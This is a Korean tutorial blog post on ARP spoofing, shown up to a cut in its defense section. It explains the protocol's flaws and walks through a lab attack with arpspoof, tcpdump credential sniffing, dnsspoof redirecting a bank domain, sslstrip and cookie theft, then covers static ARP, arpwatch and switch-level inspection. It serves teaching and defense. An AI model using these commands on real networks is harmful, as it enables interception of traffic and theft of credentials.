---
title: "ARP 스푸핑 이론과 실습"
date: 2025-04-28T21:33:35+09:00
draft: false
description: "ARP 스푸핑 공격 원리와 방어 방법을 다룬다."
tags: ["보안", "네트워크", "해킹"]
---

## ARP 스푸핑이란?

ARP 스푸핑(ARP Spoofing)은 1982년 IETF의 RFC 826 문서를 통해 표준화된 ARP(Address Resolution Protocol) 프로토콜의 구조적 취약점을 악용하는 네트워크 공격 기법으로, 공격자가 거짓된 ARP 메시지를 네트워크에 전송하여 피해자의 ARP 캐시 테이블을 조작하고 정상적인 통신 흐름을 가로채거나 변조하는 중간자 공격(Man-in-the-Middle, MITM)의 일종이며, 이 공격은 ARP 프로토콜이 설계 당시 보안보다는 효율성을 우선시하여 인증이나 무결성 검증 메커니즘을 포함하지 않았기 때문에 가능하다.

> **교육적 목적과 윤리적 사용**
>
> 이 글은 네트워크 보안 전문가, 시스템 관리자, 보안 연구자가 ARP 스푸핑의 원리를 이해하고 적절한 방어 대책을 수립하기 위한 교육적 목적으로 작성되었다. 모든 실습은 반드시 자신이 소유하거나 명시적인 허가를 받은 네트워크 환경에서만 수행해야 하며, 무단으로 타인의 네트워크에 침투하거나 공격하는 행위는 정보통신망법, 개인정보보호법 등 관련 법률에 따라 처벌받을 수 있다.

## ARP 프로토콜의 작동 원리와 취약점

ARP(Address Resolution Protocol)는 OSI 모델의 2계층과 3계층 사이에 위치하는 프로토콜로, IPv4 네트워크에서 논리적 주소인 IP 주소를 물리적 주소인 MAC 주소로 변환하는 역할을 담당하며, 이더넷과 같은 로컬 네트워크에서 데이터 프레임을 전송하기 위해서는 목적지의 MAC 주소가 반드시 필요하기 때문에 ARP가 필수적으로 사용된다.

### ARP 동작 과정

ARP의 기본적인 동작 과정은 다음과 같이 진행된다.

1. **ARP 요청(ARP Request) 생성**: 송신 호스트가 목적지 IP 주소는 알고 있지만 MAC 주소를 모를 때, ARP 요청 패킷을 생성하여 브로드캐스트 주소(FF:FF:FF:FF:FF:FF)로 로컬 네트워크의 모든 호스트에게 전송하며, 이 패킷에는 "IP 주소 X를 가진 호스트는 자신의 MAC 주소를 알려달라"는 요청이 포함된다.

2. **ARP 응답(ARP Reply) 생성**: 해당 IP 주소를 가진 호스트만이 ARP 요청에 응답하며, 자신의 MAC 주소를 담은 ARP 응답 패킷을 유니캐스트 방식으로 요청자에게 직접 전송한다.

3. **ARP 캐시 저장**: 응답을 받은 호스트는 해당 IP-MAC 매핑 정보를 ARP 캐시 테이블에 저장하여 일정 시간(일반적으로 2~20분) 동안 재사용하며, 이를 통해 동일한 목적지로의 통신 시 ARP 요청을 반복하지 않아도 되므로 네트워크 효율성이 향상된다.

자세한 ARP 프로토콜의 작동 방식과 패킷 구조에 대해서는 [ARP 프로토콜 동작 방식](https://blog.injun.dev/how-arp-protocol-works/)을 참조한다.

### ARP 프로토콜의 구조적 취약점

ARP 프로토콜은 다음과 같은 근본적인 보안 취약점을 가지고 있으며, 이러한 설계상의 한계가 ARP 스푸핑 공격을 가능하게 한다.

**1. 인증 메커니즘 부재**

ARP 프로토콜은 송신자의 신원을 검증하는 어떠한 인증 메커니즘도 포함하지 않으며, ARP 응답을 받은 호스트는 해당 응답이 정당한 소유자로부터 온 것인지 확인할 방법이 없기 때문에 공격자가 임의로 생성한 거짓 ARP 응답도 정상적인 응답과 동일하게 처리된다.

**2. 무결성 검증 부재**

ARP 메시지에는 디지털 서명이나 메시지 인증 코드(MAC)와 같은 무결성 검증 수단이 존재하지 않으므로, 공격자가 ARP 패킷의 내용을 변조하더라도 수신자는 이를 탐지할 수 없으며, 이는 ARP 캐시 포이즈닝(ARP Cache Poisoning) 공격의 근본적인 원인이 된다.

**3. 비요청 ARP 응답 허용**

대부분의 운영체제는 ARP 요청 없이도 임의로 전송되는 ARP 응답(Gratuitous ARP 또는 Unsolicited ARP)을 수신하고 처리하며, 이러한 응답을 받으면 기존 ARP 캐시 엔트리를 새로운 값으로 자동 갱신하기 때문에 공격자는 브로드캐스트된 거짓 ARP 응답만으로도 네트워크 전체의 ARP 캐시를 조작할 수 있다.

**4. 상태 유지 방식의 한계**

ARP 캐시는 동적으로 관리되는 상태 정보로, 일정 시간(TTL, Time To Live)이 지나면 자동으로 갱신되거나 삭제되며, 공격자는 이 갱신 주기에 맞춰 지속적으로 거짓 ARP 응답을 전송함으로써 공격 상태를 유지할 수 있고, 피해자는 정상적인 ARP 캐시 갱신과 공격을 구분하기 어렵다.

**5. 브로드캐스트 기반 통신**

ARP 요청은 브로드캐스트 방식으로 전송되기 때문에 동일 네트워크 세그먼트의 모든 호스트가 ARP 트래픽을 수신하고 분석할 수 있으며, 공격자는 정상적인 ARP 트래픽을 관찰하여 네트워크 토폴로지와 활성 호스트 정보를 파악할 수 있고, 이를 바탕으로 표적화된 ARP 스푸핑 공격을 계획할 수 있다.

## ARP 스푸핑의 공격 원리

ARP 스푸핑 공격은 공격자가 거짓된 ARP 메시지를 네트워크에 전송하여 피해자의 ARP 캐시 테이블을 조작하는 방식으로 진행되며, 공격 대상과 범위에 따라 단방향 스푸핑과 양방향 스푸핑으로 구분할 수 있고, 각각의 공격 방식은 서로 다른 목적과 효과를 가진다.

### 단방향 ARP 스푸핑

단방향 ARP 스푸핑은 피해자 호스트 또는 게이트웨이 중 한쪽만을 대상으로 ARP 캐시를 조작하는 공격 방식으로, 공격 범위가 제한적이지만 특정 시나리오에서는 효과적으로 사용될 수 있다.

**피해자 호스트 대상 스푸핑**

공격자가 피해자 호스트에게 거짓 ARP 응답을 전송하여 "게이트웨이의 IP 주소에 대응하는 MAC 주소가 공격자의 MAC 주소"라고 속이면, 피해자는 게이트웨이로 전송하려는 모든 패킷을 공격자에게 보내게 되며, 공격자는 이 트래픽을 감청하거나 변조한 후 실제 게이트웨이로 전달할 수 있고, 이 경우 게이트웨이에서 피해자로 향하는 응답 트래픽은 정상적으로 직접 전달되므로 피해자는 일부 비대칭적인 네트워크 지연을 경험할 수 있다.

```bash
# 피해자를 대상으로 게이트웨이 IP를 스푸핑
sudo arpspoof -i eth0 -t 192.168.1.11 -r 192.168.1.1
```

**게이트웨이 대상 스푸핑**

반대로 공격자가 게이트웨이에게 거짓 ARP 응답을 전송하여 "피해자의 IP 주소에 대응하는 MAC 주소가 공격자의 MAC 주소"라고 속이면, 게이트웨이는 피해자로 전송하려는 모든 패킷을 공격자에게 보내게 되며, 이 경우 피해자에서 게이트웨이로 향하는 트래픽은 정상적으로 전달되지만 게이트웨이에서 피해자로 돌아오는 응답 트래픽이 공격자를 경유하게 된다.

```bash
# 게이트웨이를 대상으로 피해자 IP를 스푸핑
sudo arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.11
```

단방향 스푸핑은 일부 트래픽만 가로챌 수 있으므로 완전한 중간자 공격을 위해서는 양방향 스푸핑이 필요하다.

### 양방향 ARP 스푸핑 (완전한 MITM 공격)

양방향 ARP 스푸핑은 피해자 호스트와 게이트웨이 양쪽 모두의 ARP 캐시를 동시에 조작하는 공격 방식으로, 두 호스트 간의 모든 양방향 트래픽이 공격자를 경유하도록 만들며, 이는 완전한 중간자 공격(Man-in-the-Middle Attack)을 구현하는 가장 효과적인 방법이다.

공격자는 피해자에게 "게이트웨이의 MAC 주소가 공격자의 것"이라고 속이는 동시에, 게이트웨이에게 "피해자의 MAC 주소가 공격자의 것"이라고 속이며, 이로 인해 피해자와 게이트웨이 양쪽 모두가 상대방과 통신할 때 실제로는 공격자에게 패킷을 전송하게 되고, 공격자는 모든 트래픽을 실시간으로 감청, 분석, 변조한 후 목적지로 전달할 수 있다.

```bash
# 양방향 스푸핑을 위해 두 명령을 동시에 실행
sudo arpspoof -i eth0 -t 192.168.1.11 -r 192.168.1.1 &
sudo arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.11 &
```

![ARP Spoofing Attack Flow](arp-spoofing-flow.png)

양방향 스푸핑은 단방향 스푸핑에 비해 다음과 같은 장점을 가진다.

1. **완전한 트래픽 가시성**: 송수신 양방향 트래픽을 모두 확인할 수 있어 세션 전체의 컨텍스트를 파악할 수 있다.
2. **투명한 공격**: 피해자와 게이트웨이 모두 정상적인 통신이 이루어지는 것처럼 인식하므로 공격 탐지가 어렵다.
3. **실시간 변조 가능**: 요청과 응답 모두를 가로채므로 HTTP 응답 변조, DNS 스푸핑 등 고급 공격 기법을 적용할 수 있다.
4. **세션 하이재킹**: 양방향 트래픽을 제어하므로 세션 쿠키나 인증 토큰을 탈취하여 세션을 완전히 장악할 수 있다.

### ARP 스푸핑 공격의 지속성 유지

ARP 캐시 엔트리는 운영체제마다 다른 TTL(Time To Live) 값을 가지며, 일반적으로 Linux는 60~300초, Windows는 120~300초, macOS는 1200초 정도의 유효 시간을 가지기 때문에 공격자는 캐시가 만료되기 전에 주기적으로 거짓 ARP 응답을 재전송하여 공격 상태를 지속적으로 유지해야 하며, arpspoof와 같은 도구는 이러한 재전송을 자동으로 수행하여 공격의 연속성을 보장한다.

```bash
# arpspoof는 기본적으로 1초마다 ARP 패킷을 재전송
# -r 옵션 사용 시 양방향 스푸핑을 자동으로 처리
sudo arpspoof -i eth0 -t 192.168.1.11 -r 192.168.1.1
```

## ARP 스푸핑 실습 환경 구성

ARP 스푸핑의 원리를 이해하고 방어 기법을 테스트하기 위해서는 통제된 실습 환경에서의 실습이 필수적이며, 다음은 안전하고 효과적인 실습 환경 구성 방법이다.

### 실습 환경 요구사항

**네트워크 구성**

- 공격자 머신: Ubuntu 24.04 LTS (IP: 192.168.1.10, MAC: 00:0C:29:12:34:56)
- 피해자 머신: Windows 11 또는 Ubuntu 24.04 (IP: 192.168.1.11, MAC: 00:0C:29:AB:CD:EF)
- 게이트웨이/라우터: 가정용 라우터 또는 가상 라우터 (IP: 192.168.1.1, MAC: AA:BB:CC:DD:EE:FF)
- 네트워크: 192.168.1.0/24 서브넷, 모든 호스트가 동일한 브로드캐스트 도메인에 위치

**중요한 제약사항**

1. **동일 서브넷 요구사항**: ARP는 브로드캐스트 기반 프로토콜이므로 공격자와 피해자가 반드시 동일한 물리적 네트워크 세그먼트(같은 스위치, 같은 VLAN)에 연결되어 있어야 하며, 서로 다른 서브넷이나 라우터를 경유하는 원격 네트워크에서는 ARP 스푸핑이 불가능하다.

2. **격리된 테스트 환경**: 실습은 반드시 인터넷과 분리된 가상 네트워크(VirtualBox NAT Network, VMware Host-only Network) 또는 물리적으로 격리된 테스트 랩에서 수행해야 하며, 회사 네트워크나 공용 네트워크에서의 실습은 법적 문제를 야기할 수 있다.

3. **명시적 허가**: 모든 실습 대상 시스템은 자신이 소유하거나 서면으로 명시적인 테스트 허가를 받은 시스템이어야 하며, 무단 침투 테스트는 정보통신망법 제48조(정보통신망 침해행위 등의 금지)에 따라 처벌받을 수 있다.

### 가상 환경 구성 (권장)

가장 안전한 실습 방법은 VirtualBox, VMware, KVM 등의 가상화 플랫폼을 사용하여 완전히 격리된 가상 네트워크를 구성하는 것이며, 다음은 VirtualBox를 사용한 실습 환경 구성 예시다.

**VirtualBox 네트워크 설정**

1. VirtualBox 관리자에서 `파일 > 환경 설정 > 네트워크 > NAT 네트워크 추가`를 선택한다.
2. 새로운 NAT 네트워크를 생성하고 네트워크 CIDR을 `192.168.1.0/24`로 설정한다.
3. DHCP를 비활성화하고 수동으로 IP 주소를 할당한다.
4. 각 가상 머신의 네트워크 설정에서 "NAT 네트워크"를 선택하고 위에서 생성한 네트워크를 지정한다.
5. 가상 머신 부팅 후 네트워크 인터페이스에 고정 IP 주소를 할당한다.

이러한 구성을 통해 호스트 시스템과 실제 네트워크로부터 완전히 격리되면서도 가상 머신 간에는 자유롭게 통신할 수 있는 안전한 실습 환경을 구축할 수 있다.

### 필수 도구 설치

**공격자 머신 (Ubuntu 24.04)**

ARP 스푸핑을 수행하기 위해 dsniff 패키지를 설치하며, 이 패키지에는 arpspoof, dnsspoof, urlsnarf 등 다양한 네트워크 공격 및 감사 도구가 포함되어 있다.

```bash
# 패키지 저장소 업데이트 및 dsniff 설치
sudo apt update
sudo apt install -y dsniff

# arpspoof 버전 확인
arpspoof -V
```

패킷 캡처 및 분석을 위해 tcpdump와 Wireshark를 설치한다.

```bash
# 명령줄 기반 패킷 캡처 도구
sudo apt install -y tcpdump

# GUI 기반 패킷 분석 도구 (선택 사항)
sudo apt install -y wireshark

# 현재 사용자를 wireshark 그룹에 추가 (root 권한 없이 캡처 가능)
sudo usermod -aG wireshark $USER

# 그룹 변경 사항 적용을 위해 재로그인 필요
newgrp wireshark
```

**피해자 머신 (Windows 또는 Ubuntu)**

피해자 머신에는 특별한 도구 설치가 필요하지 않으며, ARP 캐시를 확인하기 위한 기본 네트워크 명령어만 사용한다.

Windows에서 ARP 캐시 확인:
```powershell
# ARP 테이블 조회
arp -a

# 특정 인터페이스의 ARP 테이블만 조회
arp -a -N 192.168.1.11

# ARP 캐시 삭제 (관리자 권한 필요)
arp -d
```

Ubuntu에서 ARP 캐시 확인:
```bash
# ARP 테이블 조회 (구형 명령어)
arp -a

# 또는 최신 ip 명령어 사용
ip neigh show

# ARP 캐시 삭제
sudo ip neigh flush all
```

## ARP 스푸핑 공격 실습

이제 실제 ARP 스푸핑 공격을 단계별로 실습하며, 각 단계의 원리와 효과를 확인한다.

### 1단계: 공격 전 네트워크 상태 확인

공격을 시작하기 전에 정상적인 네트워크 상태에서의 ARP 테이블과 통신 흐름을 확인한다.

**피해자 머신에서 정상 ARP 테이블 확인**

```bash
# 피해자 머신 (192.168.1.11)에서 실행
$ ip neigh show
192.168.1.1 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE
192.168.1.10 dev eth0 lladdr 00:0c:29:12:34:56 REACHABLE
```

위 출력에서 게이트웨이(192.168.1.1)의 MAC 주소가 `aa:bb:cc:dd:ee:ff`로 정상적으로 매핑되어 있음을 확인할 수 있다.

**공격자 머신에서 네트워크 인터페이스 확인**

```bash
# 공격자 머신 (192.168.1.10)에서 실행
$ ip addr show eth0
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:12:34:56 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0

$ ip route show
default via 192.168.1.1 dev eth0
192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.10
```

공격자의 MAC 주소(`00:0c:29:12:34:56`)와 네트워크 인터페이스 이름(`eth0`)을 확인하며, 이 정보는 arpspoof 명령 실행 시 필요하다.

### 2단계: IP 포워딩 활성화

ARP 스푸핑 공격이 성공하면 피해자의 모든 트래픽이 공격자를 경유하게 되며, 이때 공격자가 패킷을 제대로 중계하지 않으면 피해자의 네트워크 연결이 완전히 끊기게 되므로 의도치 않은 서비스 거부 공격(Denial of Service)이 발생한다.

이를 방지하고 투명한 중간자 공격을 수행하기 위해서는 Linux 커널의 IP 포워딩 기능을 활성화하여 공격자 머신이 라우터처럼 동작하도록 설정해야 한다.

```bash
# 현재 IP 포워딩 상태 확인 (0: 비활성화, 1: 활성화)
cat /proc/sys/net/ipv4/ip_forward

# IP 포워딩 일시적 활성화 (재부팅 시 초기화됨)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# 또는 sysctl 명령 사용
sudo sysctl -w net.ipv4.ip_forward=1

# 영구적 활성화 (재부팅 후에도 유지)
echo 'net.ipv4.ip_forward=1' | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

IP 포워딩이 활성화되면 공격자 머신은 수신한 패킷의 목적지 MAC 주소가 자신의 것이 아니더라도 라우팅 테이블을 참조하여 적절한 다음 홉(next hop)으로 전달하며, 이를 통해 피해자와 게이트웨이 간의 통신이 공격자를 경유하더라도 정상적으로 유지될 수 있다.

### 3단계: 양방향 ARP 스푸핑 실행

이제 arpspoof 도구를 사용하여 피해자와 게이트웨이 양쪽의 ARP 캐시를 동시에 조작한다.

```bash
# 터미널 1: 피해자에게 게이트웨이를 스푸핑
sudo arpspoof -i eth0 -t 192.168.1.11 -r 192.168.1.1
```

위 명령은 피해자(192.168.1.11)에게 "게이트웨이 192.168.1.1의 MAC 주소가 공격자의 MAC 주소"라는 거짓 ARP 응답을 1초마다 지속적으로 전송한다.

```bash
# 터미널 2: 게이트웨이에게 피해자를 스푸핑
sudo arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.11
```

위 명령은 게이트웨이(192.168.1.1)에게 "피해자 192.168.1.11의 MAC 주소가 공격자의 MAC 주소"라는 거짓 ARP 응답을 1초마다 지속적으로 전송한다.

또는 백그라운드에서 두 프로세스를 동시에 실행할 수 있다.

```bash
# 양방향 스푸핑을 백그라운드에서 실행
sudo arpspoof -i eth0 -t 192.168.1.11 -r 192.168.1.1 > /dev/null 2>&1 &
sudo arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.11 > /dev/null 2>&1 &

# 실행 중인 arpspoof 프로세스 확인
ps aux | grep arpspoof

# 공격 중지 시 프로세스 종료
sudo killall arpspoof
```

### 4단계: ARP 캐시 변조 확인

공격이 성공했는지 확인하기 위해 피해자 머신에서 ARP 테이블을 다시 조회한다.

```bash
# 피해자 머신에서 실행
$ ip neigh show
192.168.1.1 dev eth0 lladdr 00:0c:29:12:34:56 REACHABLE
192.168.1.10 dev eth0 lladdr 00:0c:29:12:34:56 REACHABLE
```

게이트웨이(192.168.1.1)의 MAC 주소가 공격자의 MAC 주소(`00:0c:29:12:34:56`)로 변조되어 있으면 공격이 성공한 것이며, 이제 피해자가 게이트웨이로 전송하는 모든 패킷은 실제로 공격자에게 전달된다.

Windows 피해자의 경우:
```powershell
C:\> arp -a

Interface: 192.168.1.11 --- 0x8
  Internet Address      Physical Address      Type
  192.168.1.1           00-0c-29-12-34-56     dynamic
  192.168.1.10          00-0c-29-12-34-56     dynamic
```

### 5단계: 트래픽 캡처 및 분석

공격자 머신에서 tcpdump 또는 Wireshark를 사용하여 중계되는 트래픽을 실시간으로 캡처하고 분석한다.

**tcpdump를 사용한 트래픽 감청**

```bash
# 피해자의 모든 트래픽 캡처 (ASCII 형식으로 출력)
sudo tcpdump -i eth0 -n -A host 192.168.1.11

# HTTP 트래픽만 필터링하여 캡처
sudo tcpdump -i eth0 -n -A 'tcp port 80 and host 192.168.1.11'

# 트래픽을 파일로 저장하여 나중에 분석
sudo tcpdump -i eth0 -w capture.pcap host 192.168.1.11

# 캡처된 파일을 읽어서 분석
tcpdump -r capture.pcap -n -A | less
```

주요 옵션 설명:
- `-i eth0`: 캡처할 네트워크 인터페이스 지정
- `-n`: IP 주소를 DNS 이름으로 변환하지 않음 (더 빠른 캡처)
- `-A`: 패킷 페이로드를 ASCII 텍스트로 출력 (HTTP, SMTP 등 텍스트 프로토콜 분석에 유용)
- `-w capture.pcap`: 캡처한 패킷을 PCAP 파일로 저장
- `host 192.168.1.11`: 특정 호스트와의 트래픽만 캡처

**Wireshark를 사용한 심층 분석**

GUI 환경에서는 Wireshark를 사용하여 더 직관적이고 상세한 패킷 분석이 가능하다.

```bash
# Wireshark 실행 (루트 권한 필요)
sudo wireshark

# 또는 wireshark 그룹에 속한 경우 일반 권한으로 실행
wireshark
```

Wireshark에서 유용한 디스플레이 필터:
- `ip.addr == 192.168.1.11`: 특정 IP 주소와 관련된 모든 트래픽
- `http`: HTTP 프로토콜만 표시
- `http.request`: HTTP 요청만 표시
- `http.request.method == "POST"`: POST 요청만 표시 (로그인 정보 탈취에 유용)
- `tcp.flags.syn == 1`: TCP 연결 시작 패킷 (포트 스캐닝 탐지)
- `dns`: DNS 쿼리 및 응답

**민감 정보 추출 예시**

피해자가 HTTP 웹사이트에 로그인하는 경우 tcpdump 출력에서 평문 자격증명을 확인할 수 있다.

```bash
$ sudo tcpdump -i eth0 -n -A 'tcp port 80 and host 192.168.1.11' | grep -i -A 5 'POST'

POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=victim&password=secret123
```

이는 HTTPS를 사용하지 않는 웹사이트의 심각한 보안 위험성을 보여주는 사례이며, 현대 웹 애플리케이션은 반드시 TLS/SSL 암호화를 사용하여 이러한 공격으로부터 보호되어야 한다.

### 6단계: 공격 종료 및 정상 상태 복구

실습이 끝나면 arpspoof 프로세스를 종료하고 피해자의 ARP 캐시를 정상 상태로 복구한다.

```bash
# 공격자 머신에서 arpspoof 종료
sudo killall arpspoof

# IP 포워딩 비활성화
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

피해자 머신에서 ARP 캐시를 수동으로 삭제하면 다음 통신 시 정상적인 ARP 요청-응답 과정을 통해 올바른 MAC 주소를 학습하게 된다.

```bash
# 피해자 머신 (Ubuntu)에서 ARP 캐시 삭제
sudo ip neigh flush all

# 피해자 머신 (Windows)에서 ARP 캐시 삭제
arp -d
```

또는 ARP 캐시의 TTL이 만료될 때까지 기다리면 자동으로 정상 상태로 복구된다.

## ARP 스푸핑으로 가능한 고급 공격 기법

ARP 스푸핑을 통해 중간자(MITM) 위치를 확보하면 다양한 2차 공격 기법을 적용할 수 있으며, 이러한 기법들은 네트워크 보안의 여러 계층에서 심각한 위협이 된다.

### HTTP 트래픽 변조 및 스크립트 삽입

공격자는 중계되는 HTTP 응답을 실시간으로 변조하여 악성 JavaScript 코드를 삽입하거나 웹 페이지 내용을 변경할 수 있으며, 이를 통해 피싱 공격, 광고 삽입, 악성코드 유포 등이 가능하다.

BetterCAP, mitmproxy, bdfproxy 같은 도구를 사용하면 HTTP 트래픽을 자동으로 감지하고 변조할 수 있으며, 예를 들어 모든 HTTP 응답에 BeEF(Browser Exploitation Framework) 후킹 스크립트를 삽입하여 피해자의 브라우저를 원격으로 제어할 수 있다.

### DNS 스푸핑 (DNS Hijacking)

ARP 스푸핑과 함께 DNS 스푸핑을 수행하면 피해자가 접속하려는 도메인의 IP 주소를 공격자가 제어하는 악성 서버로 변경할 수 있으며, dnsspoof 도구를 사용하여 특정 도메인에 대한 DNS 응답을 위조할 수 있다.

```bash
# /etc/hosts 형식의 DNS 스푸핑 규칙 파일 생성
echo "192.168.1.50 www.bank.com" | sudo tee /etc/dnsspoof.conf

# ARP 스푸핑과 함께 DNS 스푸핑 실행
sudo dnsspoof -i eth0 -f /etc/dnsspoof.conf
```

이를 통해 피해자가 정상적인 은행 웹사이트 주소를 입력하더라도 공격자가 준비한 피싱 사이트로 리다이렉트되며, 피해자는 URL이 정상적으로 보이기 때문에 공격을 인지하기 어렵다.

### SSL 스트리핑 (SSL Stripping)

HTTPS 웹사이트도 최초 접속 시 HTTP로 시작하여 HTTPS로 리다이렉트되는 경우가 많으며, 공격자는 이 리다이렉트를 가로채 HTTPS 연결을 HTTP로 다운그레이드시킬 수 있고, 이를 SSL 스트리핑 공격이라고 한다.

sslstrip 도구를 사용하면 HTTPS 링크를 HTTP 링크로 자동 변환하며, 공격자는 피해자와 HTTP로 통신하면서 실제 서버와는 HTTPS로 통신하여 피해자가 전송하는 모든 데이터를 평문으로 가로챌 수 있다.

```bash
# SSL 스트리핑 공격 실행 (포트 10000에서 대기)
sudo sslstrip -l 10000

# iptables로 HTTP 트래픽을 sslstrip으로 리다이렉트
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

HSTS(HTTP Strict Transport Security) 헤더를 사용하는 웹사이트는 이 공격에 대한 방어력을 가지지만, 사용자가 해당 사이트를 한 번도 방문한 적이 없다면 HSTS 정책이 브라우저에 저장되지 않아 여전히 취약하다.

### 세션 하이재킹 (Session Hijacking)

웹 애플리케이션의 세션 쿠키를 가로채면 피해자의 인증된 세션을 탈취할 수 있으며, 공격자는 탈취한 쿠키를 자신의 브라우저에 주입하여 피해자로 위장하고 피해자의 계정으로 로그인할 수 있다.

Wireshark 또는 tcpdump로 캡처한 트래픽에서 `Set-Cookie` 헤더를 추출하면 세션 쿠키를 확인할 수 있으며, Cookie Manager 같은 브라우저 확장 프로그램을 사용하여 해당 쿠키를 주입할 수 있다.

```bash
# HTTP 트래픽에서 쿠키 추출
sudo tcpdump -i eth0 -n -A 'tcp port 80' | grep -i 'Cookie:'
```

현대 웹 애플리케이션은 세션 쿠키에 `Secure` 플래그(HTTPS에서만 전송), `HttpOnly` 플래그(JavaScript 접근 차단), `SameSite` 속성(CSRF 방어)을 설정하여 이러한 공격을 완화할 수 있다.

### 비암호화 프로토콜 공격

FTP(21번 포트), Telnet(23번 포트), SMTP(25번 포트), POP3(110번 포트), IMAP(143번 포트) 등 암호화되지 않은 레거시 프로토콜은 ARP 스푸핑 공격에 완전히 노출되어 있으며, 이러한 프로토콜로 전송되는 사용자명, 비밀번호, 이메일 내용 등이 모두 평문으로 가로채진다.

```bash
# FTP 자격증명 감청
sudo tcpdump -i eth0 -n -A 'tcp port 21' | grep -i -E 'USER|PASS'

# SMTP 이메일 내용 감청
sudo tcpdump -i eth0 -n -A 'tcp port 25' | grep -i -A 20 'DATA'
```

조직에서는 이러한 프로토콜을 SFTP(SSH File Transfer Protocol), SSH, SMTP over TLS, POP3S, IMAPS 등 암호화된 대안으로 마이그레이션해야 한다.

### VoIP 도청 (VoIP Eavesdropping)

SIP(Session Initiation Protocol) 기반 VoIP 통신이 암호화되지 않은 경우 ARP 스푸핑을 통해 음성 트래픽을 가로채고 녹음할 수 있으며, Wireshark는 RTP(Real-time Transport Protocol) 스트림을 추출하고 재생하는 기능을 내장하고 있다.

VoIP 보안을 위해서는 SRTP(Secure RTP), TLS 기반 SIP, VPN 터널링 등의 암호화 방법을 적용해야 한다.

## ARP 스푸핑 방어 기법

ARP 스푸핑은 프로토콜의 구조적 취약점을 악용하는 공격이므로 단일 방어 기법만으로는 완전한 보호가 어려우며, 엔드포인트 보호, 네트워크 인프라 보안, 탐지 및 모니터링, 트래픽 암호화 등 다층 방어(Defense in Depth) 전략을 적용해야 한다.

![ARP Spoofing Defense Layers](defense-layers.png)

### 계층 1: 엔드포인트 보호

**정적 ARP 엔트리 설정**

중요한 시스템(게이트웨이, DNS 서버, 도메인 컨트롤러 등)에 대해 정적 ARP 엔트리를 설정하면 공격자의 거짓 ARP 응답이 캐시를 덮어쓸 수 없으므로 해당 시스템으로의 통신은 ARP 스푸핑으로부터 보호된다.

```bash
# Ubuntu/Linux에서 정적 ARP 엔트리 추가
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# 또는 ip 명령어 사용 (권장)
sudo ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0 nud permanent

# 정적 엔트리 확인 (PERMANENT로 표시됨)
ip neigh show

# 부팅 시 자동으로 정적 ARP 설정을 위해 스크립트 작성
echo '#!/bin/bash' | sudo tee /etc/network/if-up.d/static-arp
echo 'ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0 nud permanent' | sudo tee -a /etc/network/if-up.d/static-arp
sudo chmod +x /etc/network/if-up.d/static-arp
```

Windows에서 정적 ARP 엔트리 추가:
```powershell
# 정적 ARP 엔트리 추가
netsh interface ipv4 add neighbors "이더넷" 192.168.1.1 aa-bb-cc-dd-ee-ff

# 정적 엔트리 확인
arp -a

# 영구 정적 ARP 엔트리 (재부팅 후에도 유지)
arp -s 192.168.1.1 aa-bb-cc-dd-ee-ff
```

정적 ARP 엔트리는 효과적이지만 다음과 같은 한계가 있다.
- 관리 부담: 네트워크 변경 시 모든 호스트의 정적 엔트리를 수동으로 업데이트해야 한다.
- 확장성 문제: 대규모 네트워크에서는 관리가 매우 어렵다.
- 오류 가능성: 잘못된 MAC 주소를 입력하면 통신이 완전히 차단된다.

따라서 정적 ARP는 게이트웨이와 같은 소수의 핵심 인프라에만 적용하는 것이 현실적이다.

**ARP 모니터링 도구 사용**

arpwatch, XArp, ArpON 등의 도구는 네트워크의 ARP 테이블 변화를 실시간으로 모니터링하고 비정상적인 IP-MAC 매핑 변경을 감지하여 관리자에게 경고한다.

```bash
# arpwatch 설치 (Ubuntu/Debian)
sudo apt install -y arpwatch

# 특정 인터페이스 모니터링 시작
sudo arpwatch -i eth0

# 알림 수신을 위한 이메일 주소 설정
sudo vim /etc/arpwatch/arpwatch.conf
# EMAIL="admin@example.com" 추가

# arpwatch 로그 확인
sudo tail -f /var/log/arpwatch.log

# 로그 예시: IP-MAC 매핑 변경 감지
# changed ethernet address 192.168.1.1 aa:bb:cc:dd:ee:ff (old) to 00:0c:29:12:34:56 (new)
```

arpwatch는 다음과 같은 이벤트를 탐지하고 로깅한다.
- `new activity`: 새로운 호스트 발견
- `new station`: 이전에 본 적 없는 MAC 주소
- `flip flop`: IP 주소가 두 개의 서로 다른 MAC 주소 간에 빠르게 전환됨 (ARP 스푸핑의 명확한 징후)
- `changed ethernet address`: 기존 IP의 MAC 주소가 변경됨

### 계층 2: 네트워크 인프라 보안

**Dynamic ARP Inspection (DAI)**

DAI는 Cisco, Juniper, HP 등 엔터프라이즈 스위치에서 지원하는 기능으로, 스위치가 모든 ARP 패킷을 검사하여 DHCP 스누핑 바인딩 테이블 또는 수동으로 설정한 ARP ACL과 비교하고, 일치하지 않는 ARP 응답은 자동으로 드롭하여 ARP 스푸핑을 네트워크 레벨에서 차단한다.

Cisco IOS 스위치에서 DAI 설정 예시:

```cisco
! DHCP 스누핑 활성화 (DAI의 전제조건)
Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan 10,20,30
Switch(config)# no ip dhcp snooping information option

! 신뢰할 수 있는 포트 지정 (DHCP 서버 연결 포트, 업링크 포트)
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# ip dhcp snooping trust
Switch(config-if)# exit

! DAI 활성화
Switch(config)# ip arp inspection vlan 10,20,30

! 신뢰할 수 있는 포트에서는 DAI 검사 우회
Switch(config)# interface GigabitEthernet0/1
